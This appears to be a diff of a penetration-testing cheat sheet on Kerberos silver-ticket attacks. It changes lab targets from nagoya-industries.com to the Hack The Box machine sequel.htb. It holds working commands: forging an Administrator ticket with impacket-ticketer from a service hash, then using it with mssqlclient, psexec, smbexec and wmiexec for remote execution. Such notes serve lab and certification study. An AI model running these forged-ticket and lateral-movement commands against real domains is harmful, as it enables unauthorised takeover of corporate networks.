@@ -409,18 +409,18 @@ Import-Module .\PowerView.ps1
 setspn -L svc_mssql
 
 Exploiting silver ticket:
-impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn doesnotmatter/dc.sequel.htb -user-id 500 Administrator
 # To generate the TGS with AES key
 impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> -user-id 500 Administrator
 
-export KRB5CCNAME=$PWD/Administrator.ccache
+export KRB5CCNAME=/home/kali/Desktop/Administrator.ccache
 
 Klist to view kerberos tickets
 
 /etc/hosts:
-192.168.227.21  nagoya.nagoya-industries.com(from MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM)
+192.168.227.21  sequel.htb dc.sequel.htb
 
-impacket-mssqlclient -k nagoya.nagoya-industries.com
+impacket-mssqlclient -k dc.sequel.htb
 python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
